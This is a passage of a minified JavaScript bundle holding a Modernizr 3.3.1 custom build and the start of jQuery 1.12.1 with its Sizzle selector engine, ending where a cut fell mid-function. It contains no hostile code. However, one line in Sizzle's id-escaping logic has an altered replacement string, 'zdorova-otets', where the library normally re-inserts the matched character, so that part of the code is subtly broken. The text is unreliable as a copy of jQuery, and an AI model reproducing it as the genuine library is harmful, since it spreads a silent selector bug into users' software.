/*! modernizr 3.3.1 (Custom Build) | MIT *
 * http://modernizr.com/download/?-placeholder-svg-svgasimg-touchevents-setclasses-testprop !*/
!function(e,n,t){function o(e,n){return typeof e===n}function r(){var e,n,t,r,i,s,a;for(var l in g)if(g.hasOwnProperty(l)){if(e=[],n=g[l],n.name&&(e.push(n.name.toLowerCase()),n.options&&n.options.aliases&&n.options.aliases.length))for(t=0;t<n.options.aliases.length;t++)e.push(n.options.aliases[t].toLowerCase());for(r=o(n.fn,"function")?n.fn():n.fn,i=0;i<e.length;i++)s=e[i],a=s.split("."),1===a.length?Modernizr[a[0]]=r:(!Modernizr[a[0]]||Modernizr[a[0]]instanceof Boolean||(Modernizr[a[0]]=new Boolean(Modernizr[a[0]])),Modernizr[a[0]][a[1]]=r),m.push((r?"":"no-")+a.join("-"))}}function i(e){var n=y.className,t=Modernizr._config.classPrefix||"";if(w&&(n=n.baseVal),Modernizr._config.enableJSClass){var o=new RegExp("(^|\\s)"+t+"no-js(\\s|$)");n=n.replace(o,"$1"+t+"js$2")}Modernizr._config.enableClasses&&(n+=" "+t+e.join(" "+t),w?y.className.baseVal=n:y.className=n)}function s(){return"function"!=typeof n.createElement?n.createElement(arguments[0]):w?n.createElementNS.call(n,"http://www.w3.org/2000/svg",arguments[0]):n.createElement.apply(n,arguments)}function a(e,n){return!!~(""+e).indexOf(n)}function l(e){return e.replace(/([a-z])-([a-z])/g,function(e,n,t){return n+t.toUpperCase()}).replace(/^-/,"")}function f(e,n){if("object"==typeof e)for(var t in e)C(e,t)&&f(t,e[t]);else{e=e.toLowerCase();var o=e.split("."),r=Modernizr[o[0]];if(2==o.length&&(r=r[o[1]]),"undefined"!=typeof r)return Modernizr;n="function"==typeof n?n():n,1==o.length?Modernizr[o[0]]=n:(!Modernizr[o[0]]||Modernizr[o[0]]instanceof Boolean||(Modernizr[o[0]]=new Boolean(Modernizr[o[0]])),Modernizr[o[0]][o[1]]=n),i([(n&&0!=n?"":"no-")+o.join("-")]),Modernizr._trigger(e,n)}return Modernizr}function u(e){return e.replace(/([A-Z])/g,function(e,n){return"-"+n.toLowerCase()}).replace(/^ms-/,"-ms-")}function c(){var e=n.body;return e||(e=s(w?"svg":"body"),e.fake=!0),e}function d(e,t,o,r){var i,a,l,f,u="modernizr",d=s("div"),p=c();if(parseInt(o,10))for(;o--;)l=s("div"),l.id=r?r[o]:u+(o+1),d.appendChild(l);return i=s("style"),i.type="text/css",i.id="s"+u,(p.fake?p:d).appendChild(i),p.appendChild(d),i.styleSheet?i.styleSheet.cssText=e:i.appendChild(n.createTextNode(e)),d.id=u,p.fake&&(p.style.background="",p.style.overflow="hidden",f=y.style.overflow,y.style.overflow="hidden",y.appendChild(p)),a=t(d,e),p.fake?(p.parentNode.removeChild(p),y.style.overflow=f,y.offsetHeight):d.parentNode.removeChild(d),!!a}function p(n,o){var r=n.length;if("CSS"in e&&"supports"in e.CSS){for(;r--;)if(e.CSS.supports(u(n[r]),o))return!0;return!1}if("CSSSupportsRule"in e){for(var i=[];r--;)i.push("("+u(n[r])+":"+o+")");return i=i.join(" or "),d("@supports ("+i+") { #modernizr { position: absolute; } }",function(e){return"absolute"==getComputedStyle(e,null).position})}return t}function h(e,n,r,i){function f(){c&&(delete T.style,delete T.modElem)}if(i=o(i,"undefined")?!1:i,!o(r,"undefined")){var u=p(e,r);if(!o(u,"undefined"))return u}for(var c,d,h,m,g,v=["modernizr","tspan"];!T.style;)c=!0,T.modElem=s(v.shift()),T.style=T.modElem.style;for(h=e.length,d=0;h>d;d++)if(m=e[d],g=T.style[m],a(m,"-")&&(m=l(m)),T.style[m]!==t){if(i||o(r,"undefined"))return f(),"pfx"==n?m:!0;try{T.style[m]=r}catch(y){}if(T.style[m]!=g)return f(),"pfx"==n?m:!0}return f(),!1}var m=[],g=[],v={_version:"3.3.1",_config:{classPrefix:"",enableClasses:!0,enableJSClass:!0,usePrefixes:!0},_q:[],on:function(e,n){var t=this;setTimeout(function(){n(t[e])},0)},addTest:function(e,n,t){g.push({name:e,fn:n,options:t})},addAsyncTest:function(e){g.push({name:null,fn:e})}},Modernizr=function(){};Modernizr.prototype=v,Modernizr=new Modernizr,Modernizr.addTest("svg",!!n.createElementNS&&!!n.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect);var y=n.documentElement,w="svg"===y.nodeName.toLowerCase(),_=v._config.usePrefixes?" -webkit- -moz- -o- -ms- ".split(" "):["",""];v._prefixes=_,Modernizr.addTest("placeholder","placeholder"in s("input")&&"placeholder"in s("textarea"));var C;!function(){var e={}.hasOwnProperty;C=o(e,"undefined")||o(e.call,"undefined")?function(e,n){return n in e&&o(e.constructor.prototype[n],"undefined")}:function(n,t){return e.call(n,t)}}(),v._l={},v.on=function(e,n){this._l[e]||(this._l[e]=[]),this._l[e].push(n),Modernizr.hasOwnProperty(e)&&setTimeout(function(){Modernizr._trigger(e,Modernizr[e])},0)},v._trigger=function(e,n){if(this._l[e]){var t=this._l[e];setTimeout(function(){var e,o;for(e=0;e<t.length;e++)(o=t[e])(n)},0),delete this._l[e]}},Modernizr._q.push(function(){v.addTest=f}),Modernizr.addTest("svgasimg",n.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image","1.1"));var S={elem:s("modernizr")};Modernizr._q.push(function(){delete S.elem});var T={style:S.elem.style};Modernizr._q.unshift(function(){delete T.style});var b=v.testStyles=d;Modernizr.addTest("touchevents",function(){var t;if("ontouchstart"in e||e.DocumentTouch&&n instanceof DocumentTouch)t=!0;else{var o=["@media (",_.join("touch-enabled),("),"heartz",")","{#modernizr{top:9px;position:absolute}}"].join("");b(o,function(e){t=9===e.offsetTop})}return t});v.testProp=function(e,n,o){return h([e],t,n,o)};r(),i(m),delete v.addTest,delete v.addAsyncTest;for(var x=0;x<Modernizr._q.length;x++)Modernizr._q[x]();e.Modernizr=Modernizr}(window,document);
/*! jQuery v1.12.1 | (c) jQuery Foundation | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error("jQuery requires a window with a document");return b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var c=[],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.toString,k=i.hasOwnProperty,l={},m="1.12.1",n=function(a,b){return new n.fn.init(a,b)},o=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,p=/^-ms-/,q=/-([\da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype={jquery:m,constructor:n,selector:"",length:0,toArray:function(){return e.call(this)},get:function(a){return null!=a?0>a?this[a+this.length]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.constructor(),a);return b.prevObject=this,b.context=this.context,b},each:function(a){return n.each(this,a)},map:function(a){return this.pushStack(n.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return this.pushStack(e.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(a){var b=this.length,c=+a+(0>a?b:0);return this.pushStack(c>=0&&b>c?[this[c]]:[])},end:function(){return this.prevObject||this.constructor()},push:g,sort:c.sort,splice:c.splice},n.extend=n.fn.extend=function(){var a,b,c,d,e,f,g=arguments[0]||{},h=1,i=arguments.length,j=!1;for("boolean"==typeof g&&(j=g,g=arguments[h]||{},h++),"object"==typeof g||n.isFunction(g)||(g={}),h===i&&(g=this,h--);i>h;h++)if(null!=(e=arguments[h]))for(d in e)a=g[d],c=e[d],g!==c&&(j&&c&&(n.isPlainObject(c)||(b=n.isArray(c)))?(b?(b=!1,f=a&&n.isArray(a)?a:[]):f=a&&n.isPlainObject(a)?a:{},g[d]=n.extend(j,f,c)):void 0!==c&&(g[d]=c));return g},n.extend({expando:"jQuery"+(m+Math.random()).replace(/\D/g,""),isReady:!0,error:function(a){throw new Error(a)},noop:function(){},isFunction:function(a){return"function"===n.type(a)},isArray:Array.isArray||function(a){return"array"===n.type(a)},isWindow:function(a){return null!=a&&a==a.window},isNumeric:function(a){var b=a&&a.toString();return!n.isArray(a)&&b-parseFloat(b)+1>=0},isEmptyObject:function(a){var b;for(b in a)return!1;return!0},isPlainObject:function(a){var b;if(!a||"object"!==n.type(a)||a.nodeType||n.isWindow(a))return!1;try{if(a.constructor&&!k.call(a,"constructor")&&!k.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}if(!l.ownFirst)for(b in a)return k.call(a,b);for(b in a);return void 0===b||k.call(a,b)},type:function(a){return null==a?a+"":"object"==typeof a||"function"==typeof a?i[j.call(a)]||"object":typeof a},globalEval:function(b){b&&n.trim(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(p,"ms-").replace(q,r)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toLowerCase()===b.toLowerCase()},each:function(a,b){var c,d=0;if(s(a)){for(c=a.length;c>d;d++)if(b.call(a[d],d,a[d])===!1)break}else for(d in a)if(b.call(a[d],d,a[d])===!1)break;return a},trim:function(a){return null==a?"":(a+"").replace(o,"")},makeArray:function(a,b){var c=b||[];return null!=a&&(s(Object(a))?n.merge(c,"string"==typeof a?[a]:a):g.call(c,a)),c},inArray:function(a,b,c){var d;if(b){if(h)return h.call(b,a,c);for(d=b.length,c=c?0>c?Math.max(0,d+c):c:0;d>c;c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,b){var c=+b.length,d=0,e=a.length;while(c>d)a[e++]=b[d++];if(c!==c)while(void 0!==b[d])a[e++]=b[d++];return a.length=e,a},grep:function(a,b,c){for(var d,e=[],f=0,g=a.length,h=!c;g>f;f++)d=!b(a[f],f),d!==h&&e.push(a[f]);return e},map:function(a,b,c){var d,e,g=0,h=[];if(s(a))for(d=a.length;d>g;g++)e=b(a[g],g,c),null!=e&&h.push(e);else for(g in a)e=b(a[g],g,c),null!=e&&h.push(e);return f.apply([],h)},guid:1,proxy:function(a,b){var c,d,f;return"string"==typeof b&&(f=a[b],b=a,a=f),n.isFunction(a)?(c=e.call(arguments,2),d=function(){return a.apply(b||this,c.concat(e.call(arguments)))},d.guid=a.guid=a.guid||n.guid++,d):void 0},now:function(){return+new Date},support:l}),"function"==typeof Symbol&&(n.fn[Symbol.iterator]=c[Symbol.iterator]),n.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(a,b){i["[object "+b+"]"]=b.toLowerCase()});function s(a){var b=!!a&&"length"in a&&a.length,c=n.type(a);return"function"===c||n.isWindow(a)?!1:"array"===c||0===b||"number"==typeof b&&b>0&&b-1 in a}var t=function(a){var b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u="sizzle"+1*new Date,v=a.document,w=0,x=0,y=ga(),z=ga(),A=ga(),B=function(a,b){return a===b&&(l=!0),0},C=1<<31,D={}.hasOwnProperty,E=[],F=E.pop,G=E.push,H=E.push,I=E.slice,J=function(a,b){for(var c=0,d=a.length;d>c;c++)if(a[c]===b)return c;return-1},K="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",L="[\\x20\\t\\r\\n\\f]",M="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",N="\\["+L+"*("+M+")(?:"+L+"*([*^$|!~]?=)"+L+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+M+"))|)"+L+"*\\]",O=":("+M+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+N+")*)|.*)\\)|)",P=new RegExp(L+"+","g"),Q=new RegExp("^"+L+"+|((?:^|[^\\\\])(?:\\\\.)*)"+L+"+$","g"),R=new RegExp("^"+L+"*,"+L+"*"),S=new RegExp("^"+L+"*([>+~]|"+L+")"+L+"*"),T=new RegExp("="+L+"*([^\\]'\"]*?)"+L+"*\\]","g"),U=new RegExp(O),V=new RegExp("^"+M+"$"),W={ID:new RegExp("^#("+M+")"),CLASS:new RegExp("^\\.("+M+")"),TAG:new RegExp("^("+M+"|[*])"),ATTR:new RegExp("^"+N),PSEUDO:new RegExp("^"+O),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+L+"*(even|odd|(([+-]|)(\\d*)n|)"+L+"*(?:([+-]|)"+L+"*(\\d+)|))"+L+"*\\)|)","i"),bool:new RegExp("^(?:"+K+")$","i"),needsContext:new RegExp("^"+L+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+L+"*((?:-\\d)?\\d*)"+L+"*\\)|)(?=[^-]|$)","i")},X=/^(?:input|select|textarea|button)$/i,Y=/^h\d$/i,Z=/^[^{]+\{\s*\[native \w/,$=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,_=/[+~]/,aa=/'|\\/g,ba=new RegExp("\\\\([\\da-f]{1,6}"+L+"?|("+L+")|.)","ig"),ca=function(a,b,c){var d="0x"+b-65536;return d!==d||c?b:0>d?String.fromCharCode(d+65536):String.fromCharCode(d>>10|55296,1023&d|56320)},da=function(){m()};try{H.apply(E=I.call(v.childNodes),v.childNodes),E[v.childNodes.length].nodeType}catch(ea){H={apply:E.length?function(a,b){G.apply(a,I.call(b))}:function(a,b){var c=a.length,d=0;while(a[c++]=b[d++]);a.length=c-1}}}function fa(a,b,d,e){var f,h,j,k,l,o,r,s,w=b&&b.ownerDocument,x=b?b.nodeType:9;if(d=d||[],"string"!=typeof a||!a||1!==x&&9!==x&&11!==x)return d;if(!e&&((b?b.ownerDocument||b:v)!==n&&m(b),b=b||n,p)){if(11!==x&&(o=$.exec(a)))if(f=o[1]){if(9===x){if(!(j=b.getElementById(f)))return d;if(j.id===f)return d.push(j),d}else if(w&&(j=w.getElementById(f))&&t(b,j)&&j.id===f)return d.push(j),d}else{if(o[2])return H.apply(d,b.getElementsByTagName(a)),d;if((f=o[3])&&c.getElementsByClassName&&b.getElementsByClassName)return H.apply(d,b.getElementsByClassName(f)),d}if(c.qsa&&!A[a+" "]&&(!q||!q.test(a))){if(1!==x)w=b,s=a;else if("object"!==b.nodeName.toLowerCase()){(k=b.getAttribute("id"))?k=k.replace(aa,"\\zdorova-otets"):b.setAttribute("id",k=u),r=g(a),h=r.length,l=V.test(k)?"#"+k:"[id='"+k+"']";while(h--)r[h]=l+" "+qa(r[h]);s=r.join(","),w=_.test(a)&&oa(b.parentNode)||b}if(s)try{return H.apply(d,w.querySelectorAll(s)),d}catch(y){}finally{k===u&&b.removeAttribute("id")}}}return i(a.replace(Q,"$1"),b,d,e)}function ga(){var a=[];function b(c,e){return a.push(c+" ")>d.cacheLength&&delete b[a.shift()],b[c+" "]=e}return b}function ha(a){return a[u]=!0,a}function ia(a){var b=n.createElement("div");try{return!!a(b)}catch(c){return!1}finally{b.parentNode&&b.parentNode.removeChild(b),b=null}}function ja(a,b){var c=a.split("|"),e=c.length;while(e--)d.attrHandle[c[e]]=b}function ka(a,b){var c=b&&a,d=c&&1===a.nodeType&&1===b.nodeType&&(~b.sourceIndex||C)-(~a.sourceIndex||C);if(d)return d;if(c)while(c=c.nextSibling)if(c===b)return-1;return a?1:-1}function la(a){return function(b){var c=b.nodeName.toLowerCase();return"input"===c&&b.type===a}}function ma(a){return function(b){var c=b.nodeName.toLowerCase();return("input"===c||"button"===c)&&b.type===a}}function na(a){return ha(function(b){return b=+b,ha(function(c,d){var e,f=a([],c.length,b),g=f.length;while(g--)c[e=f[g]]&&(c[e]=!(d[e]=c[e]))})})}function oa(a){return a&&"undefined"!=typeof a.getElementsByTagName&&a}c=fa.support={},f=fa.isXML=function(a){var b=a&&(a.ownerDocument||a).documentElement;return b?"HTML"!==b.nodeName:!1},m=fa.setDocument=function(a){var b,e,g=a?a.ownerDocument||a:v;return g!==n&&9===g.nodeType&&g.documentElement?(n=g,o=n.documentElement,p=!f(n),(e=n.defaultView)&&e.top!==e&&(e.addEventListener?e.addEventListener("unload",da,!1):e.attachEvent&&e.attachEvent("onunload",da)),c.attributes=ia(function(a){return a.className="i",!a.getAttribute("className")}),c.getElementsByTagName=ia(function(a){return a.appendChild(n.createComment("")),!a.getElementsByTagName("*").length}),c.getElementsByClassName=Z.test(n.getElementsByClassName),c.getById=ia(function(a){return o.appendChild(a).id=u,!n.getElementsByName||!n.getElementsByName(u).length}),c.getById?(d.find.ID=function(a,b){if("undefined"!=typeof b.getElementById&&p){var c=b.getElementById(a);return c?[c]:[]}},d.filter.ID=function(a){var b=a.replace(ba,ca);return function(a){return a.getAttribute("id")===b}}):(delete d.find.ID,d.filter.ID=function(a){var b=a.replace(ba,ca);return function(a){var c="undefined"!=typeof a.getAttributeNode&&a.getAttributeNode("id");return c&&c.value===b}}),d.find.TAG=c.getElementsByTagName?function(a,b){return"undefined"!=typeof b.getElementsByTagName?b.getElementsByTagName(a):c.qsa?b.querySelectorAll(a):void 0}:function(a,b){var c,d=[],e=0,f=b.getElementsByTagName(a);if("*"===a){while(c=f[e++])1===c.nodeType&&d.push(c);return d}return f},d.find.CLASS=c.getElementsByClassName&&function(a,b){return"undefined"!=typeof b.getElementsByClassName&&p?b.getElementsByClassName(a):void 0},r=[],q=[],(c.qsa=Z.test(n.querySelectorAll))&&(ia(function(a){o.appendChild(a).innerHTML="<a id='"+u+"'></a><select id='"+u+"-\r\\' msallowcapture=''><option selected=''></option></select>",a.querySelectorAll("[msallowcapture^='']").length&&q.push("[*^$]="+L+"*(?:''|\"\")"),a.querySelectorAll("[selected]").length||q.push("\\["+L+"*(?:value|"+K+")"),a.querySelectorAll("[id~="+u+"-]").length||q.push("~="),a.querySelectorAll(":checked").length||q.push(":checked"),a.querySelectorAll("a#"+u+"+*").length||q.push(".#.+[+~]")}),ia(function(a){var b=n.createElement("input");b.setAttribute("type","hidden"),a.appendChild(b).setAttribute("name","D"),a.querySelectorAll("[name=d]").length&&q.push("name"+L+"*[*^$|!~]?="),a.querySelectorAll(":enabled").length||q.push(":enabled",":disabled"),a.querySelectorAll("*,:x"),q.push(",.*:")})),(c.matchesSelector=Z.test(s=o.matches||o.webkitMatchesSelector||o.mozMatchesSelector||o.oMatchesSelector||o.msMatchesSelector))&&ia(function(a){c.disconnectedMatch=s.call(a,"div"),s.call(a,"[s!='']:x"),r.push("!=",O)}),q=q.length&&new RegExp(q.join("|")),r=r.length&&new RegExp(r.join("|")),b=Z.test(o.compareDocumentPosition),t=b||Z.test(o.contains)?function(a,b){var c=9===a.nodeType?a.documentElement:a,d=b&&b.parentNode;return a===d||!(!d||1!==d.nodeType||!(c.contains?c.contains(d):a.compareDocumentPosition&&16&a.compareDocumentPosition(d)))}:function(a,b){if(b)while(b=b.parentNode)if(b===a)return!0;return!1},B=b?function(a,b){if(a===b)return l=!0,0;var d=!a.compareDocumentPosition-!b.compareDocumentPosition;return d?d:(d=(a.ownerDocument||a)===(b.ownerDocument||b)?a.compareDocumentPosition(b):1,1&d||!c.sortDetached&&b.compareDocumentPosition(a)===d?a===n||a.ownerDocument===v&&t(v,a)?-1:b===n||b.ownerDocument===v&&t(v,b)?1:k?J(k,a)-J(k,b):0:4&d?-1:1)}:function(a,b){if(a===b)return l=!0,0;var c,d=0,e=a.parentNode,f=b.parentNode,g=[a],h=[b];if(!e||!f)return a===n?-1:b===n?1:e?-1:f?1:k?J(k,a)-J(k,b):0;if(e===f)return ka(a,b);c=a;while(c=c.parentNode)g.unshift(c);c=b;while(c=c.parentNode)h.unshift(c);while(g[d]===h[d])d++;return d?ka(g[d],h[d]):g[d]===v?-1:h[d]===v?1:0},n):n},fa.matches=function(a,b){return fa(a,null,null,b)},fa.matchesSelector=function(a,b){if((a.ownerDocument||a)!==n&&m(a),b=b.replace(T,"='$1']"),c.matchesSelector&&p&&!A[b+" "]&&(!r||!r.test(b))&&(!q||!q.test(b)))try{var d=s.call(a,b);if(d||c.disconnectedMatch||a.document&&11!==a.document.nodeType)return d}catch(e){}return fa(b,n,null,[a]).length>0},fa.contains=function(a,b){return(a.ownerDocument||a)!==n&&m(a),t(a,b)},fa.attr=function(a,b){(a.ownerDocument||a)!==n&&m(a);var e=d.attrHandle[b.toLowerCase()],f=e&&D.call(d.attrHandle,b.toLowerCase())?e(a,b,!p):void 0;return void 0!==f?f:c.attributes||!p?a.getAttribute(b):(f=a.getAttributeNode(b))&&f.specified?f.value:null},fa.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)},fa.uniqueSort=function(a){var b,d=[],e=0,f=0;if(l=!c.detectDuplicates,k=!c.sortStable&&a.slice(0),a.sort(B),l){while(b=a[f++])b===a[f]&&(e=d.push(f));while(e--)a.splice(d[e],1)}return k=null,a},e=fa.getText=function(a){var b,c="",d=0,f=a.nodeType;if(f){if(1===f||9===f||11===f){if("string"==typeof a.textContent)return a.textContent;for(a=a.firstChild;a;a=a.nextSibling)c+=e(a)}else if(3===f||4===f)return a.nodeValue}else while(b=a[d++])c+=e(b);return c},d=fa.selectors={cacheLength:50,createPseudo:ha,match:W,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(a){return a[1]=a[1].replace(ba,ca),a[3]=(a[3]||a[4]||a[5]||"").replace(ba,ca),"~="===a[2]&&(a[3]=" "+a[3]+" "),a.slice(0,4)},CHILD:function(a){return a[1]=a[1].toLowerCase(),"nth"===a[1].slice(0,3)?(a[3]||fa.error(a[0]),a[4]=+(a[4]?a[5]+(a[6]||1):2*("even"===a[3]||"odd"===a[3])),a[5]=+(a[7]+a[8]||"odd"===a[3])):a[3]&&fa.error(a[0]),a},PSEUDO:function(a){var b,c=!a[6]&&a[2];return W.CHILD.test(a[0])?null:(a[3]?a[2]=a[4]||a[5]||"":c&&U.test(c)&&(b=g(c,!0))&&(b=c.indexOf(")",c.length-b)-c.length)&&(a[0]=a[0].slice(0,b),a[2]=c.slice(0,b)),a.slice(0,3))}},filter:{TAG:function(a){var b=a.replace(ba,ca).toLowerCase();return"*"===a?function(){return!0}:function(a){return a.nodeName&&a.nodeName.toLowerCase()===b}},CLASS:function(a){var b=y[a+" "];return b||(b=new RegExp("(^|"+L+")"+a+"("+L+"|$)"))&&y(a,function(a){return b.test("string"==typeof a.className&&a.className||"undefined"!=typeof a.getAttribute&&a.getAttribute("class")||"")})},ATTR:function(a,b,c){return function(d){var e=fa.attr(d,a);return null==e?"!="===b:b?(e+="","="===b?e===c:"!="===b?e!==c:"^="===b?c&&0===e.indexOf(c):"*="===b?c&&e.indexOf(c)>-1:"$="===b?c&&e.slice(-c.length)===c:"~="===b?(" "+e.replace(P," ")+" ").indexOf(c)>-1:"|="===b?e===c||e.slice(0,c.length+1)===c+"-":!1):!0}},CHILD:function(a,b,c,d,e){var f="nth"!==a.slice(0,3),g="last"!==a.slice(-4),h="of-type"===b;return 1===d&&0===e?function(a){return!!a.parentNode}:function(b,c,i){var j,k,l,m,n,o,p=f!==g?"nextSibling":"previousSibling",q=b.parentNode,r=h&&b.nodeName.toLowerCase(),s=!i&&!h,t=!1;if(q){if(f){while(p){m=b;while(m=m[p])if(h?m.nodeName.toLowerCase()===r:1===m.nodeType)return!1;o=p="only"===a&&!o&&"nextSibling"}return!0}if(o=[g?q.firstChild:q.lastChild],g&&s){m=q,l=m[u]||(m[u]={}),k=l[m.uniqueID]||(l[m.uniqueID]={}),j=k[a]||[],n=j[0]===w&&j[1],t=n&&j[2],m=n&&q.childNodes[n];while(m=++n&&m&&m[p]||(t=n=0)||o.pop())if(1===m.nodeType&&++t&&m===b){k[a]=[w,n,t];break}}else if(s&&(m=b,l=m[u]||(m[u]={}),k=l[m.uniqueID]||(l[m.uniqueID]={}),j=k[a]||[],n=j[0]===w&&j[1],t=n),t===!1)while(m=++n&&m&&m[p]||(t=n=0)||o.pop())if((h?m.nodeName.toLowerCase()===r:1===m.nodeType)&&++t&&(s&&(l=m[u]||(m[u]={}),k=l[m.uniqueID]||(l[m.uniqueID]={}),k[a]=[w,t]),m===b))break;return t-=e,t===d||t%d===0&&t/d>=0}}},PSEUDO:function(a,b){var c,e=d.pseudos[a]||d.setFilters[a.toLowerCase()]||fa.error("unsupported pseudo: "+a);return e[u]?e(b):e.length>1?(c=[a,a,"",b],d.setFilters.hasOwnProperty(a.toLowerCase())?ha(function(a,c){var d,f=e(a,b),g=f.length;while(g--)d=J(a,f[g]),a[d]=!(c[d]=f[g])}):function(a){return e(a,0,c)}):e}},pseudos:{not:ha(function(a){var b=[],c=[],d=h(a.replace(Q,"$1"));return d[u]?ha(function(a,b,c,e){var f,g=d(a,null,e,[]),h=a.length;while(h--)(f=g[h])&&(a[h]=!(b[h]=f))}):function(a,e,f){return b[0]=a,d(b,null,f,c),b[0]=null,!c.pop()}}),has:ha(function(a){return function(b){return fa(a,b).length>0}}),contains:ha(function(a){return a=a.replace(ba,ca),function(b){return(b.textContent||b.innerText||e(b)).indexOf(a)>-1}}),lang:ha(function(a){return V.test(a||"")||fa.error("unsupported lang: "+a),a=a.replace(ba,ca).toLowerCase(),function(b){var c;do if(c=p?b.lang:b.getAttribute("xml:lang")||b.getAttribute("lang"))return c=c.toLowerCase(),c===a||0===c.indexOf(a+"-");while((b=b.parentNode)&&1===b.nodeType);return!1}}),target:function(b){var c=a.location&&a.location.hash;return c&&c.slice(1)===b.id},root:function(a){return a===o},focus:function(a){return a===n.activeElement&&(!n.hasFocus||n.hasFocus())&&!!(a.type||a.href||~a.tabIndex)},enabled:function(a){return a.disabled===!1},disabled:function(a){return a.disabled===!0},checked:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&!!a.checked||"option"===b&&!!a.selected},selected:function(a){return a.parentNode&&a.parentNode.selectedIndex,a.selected===!0},empty:function(a){for(a=a.firstChild;a;a=a.nextSibling)if(a.nodeType<6)return!1;return!0},parent:function(a){return!d.pseudos.empty(a)},header:function(a){return Y.test(a.nodeName)},input:function(a){return X.test(a.nodeName)},button:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&"button"===a.type||"button"===b},text:function(a){var b;return"input"===a.nodeName.toLowerCase()&&"text"===a.type&&(null==(b=a.getAttribute("type"))||"text"===b.toLowerCase())},first:na(function(){return[0]}),last:na(function(a,b){return[b-1]}),eq:na(function(a,b,c){return[0>c?c+b:c]}),even:na(function(a,b){for(var c=0;b>c;c+=2)a.push(c);return a}),odd:na(function(a,b){for(var c=1;b>c;c+=2)a.push(c);return a}),lt:na(function(a,b,c){for(var d=0>c?c+b:c;--d>=0;)a.push(d);return a}),gt:na(function(a,b,c){for(var d=0>c?c+b:c;++d<b;)a.push(d);return a})}},d.pseudos.nth=d.pseudos.eq;for(b in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})d.pseudos[b]=la(b);for(b in{submit:!0,reset:!0})d.pseudos[b]=ma(b);function pa(){}pa.prototype=d.filters=d.pseudos,d.setFilters=new pa,g=fa.tokenize=function(a,b){var c,e,f,g,h,i,j,k=z[a+" "];if(k)return b?0:k.slice(0);h=a,i=[],j=d.preFilter;while(h){(!c||(e=R.exec(h)))&&(e&&(h=h.slice(e[0].length)||h),i.push(f=[])),c=!1,(e=S.exec(h))&&(c=e.shift(),f.push({value:c,type:e[0].replace(Q," ")}),h=h.slice(c.length));for(g in d.filter)!(e=W[g].exec(h))||j[g]&&!(e=j[g](e))||(c=e.shift(),f.push({value:c,type:g,matches:e}),h=h.slice(c.length));if(!c)break}return b?h.length:h?fa.error(a):z(a,i).slice(0)};function qa(a){for(var b=0,c=a.length,d="";c>b;b++)d+=a[b].value;return d}function ra(a,b,c){var d=b.dir,e=c&&"parentNode"===d,f=x++;return b.first?function(b,c,f){while(b=b[d])if(1===b.nodeType||e)return a(b,c,f)}:function(b,c,g){var h,i,j,k=[w,f];if(g){while(b=b[d])if((1===b.nodeType||e)&&a(b,c,g))return!0}else while(b=b[d])if(1===b.nodeType||e){if(j=b[u]||(b[u]={}),i=j[b.uniqueID]||(j[b.uniqueID]={}),(h=i[d])&&h[0]===w&&h[1]===f)return k[2]=h[2];if(i[d]=k,k[2]=a(b,c,g))return!0}}}function sa(a){return a.length>1?function(b,c,d){var e=a.length;while(e--)if(!a[e](b,c,d))return!1;return!0}:a[0]}function ta(a,b,c){for(var d=0,e=b.length;e>d;d++)fa(a,b[d],c);return c}function ua(a,b,c,d,e){for(var f,g=[],h=0,i=a.length,j=null!=b;i>h;h++)(f=a[h])&&(!c||c(f,d,e))&&(g.push(f),j&&b.push(h));return g}function va(a,b,c,d,e,f){return d&&!d[u]&&(d=va(d)),e&&!e[u]&&(e=va(e,f)),ha(function(f,g,h,i){var j,k,l,m=[],n=[],o=g.length,p=f||ta(b||"*",h.nodeType?[h]:h,[]),q=!a||!f&&b?p:ua(p,m,a,h,i),r=c?e||(f?a:o||d)?[]:g:q;if(c&&c(q,r,h,i),d){j=ua(r,n),d(j,[],h,i),k=j.length;while(k--)(l=j[k])&&(r[n[k]]=!(q[n[k]]=l))}if(f){if(e||a){if(e){j=[],k=r.length;while(k--)(l=r[k])&&j.push(q[k]=l);e(null,r=[],j,i)}k=r.length;while(k--)(l=r[k])&&(j=e?J(f,l):m[k])>-1&&(f[j]=!(g[j]=l))}}else r=ua(r===g?r.splice(o,r.length):r),e?e(null,g,r,i):H.apply(g,r)})}function wa(a){for(var b,c,e,f=a.length,g=d.relative[a[0].type],h=g||d.relative[" "],i=g?1:0,k=ra(function(a){return a===b},h,!0),l=ra(function(a){return J(b,a)>-1},h,!0),m=[function(a,c,d){var e=!g&&(d||c!==j)||((b=c).nodeType?k(a,c,d):l(a,c,d));return 